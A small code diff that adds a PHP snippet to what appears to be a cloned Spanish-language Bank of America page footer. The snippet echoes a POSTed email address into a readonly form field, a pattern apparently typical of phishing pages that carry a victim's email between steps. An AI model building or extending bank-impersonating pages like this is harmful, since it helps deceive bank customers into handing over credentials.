@@ -86,6 +86,11 @@
                 <a href="#">
                     Igualdad de oportunidades en préstamos para viviendas
                 </a>
+                
+                <?php 
+                     $variable= $_POST['email'];
+        echo '<a href="index.php"></a><input id="dato" name="email" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
+		?>
 
                 <span class="corporation">© 2021 Bank of America Corporation.</span>
             </div>
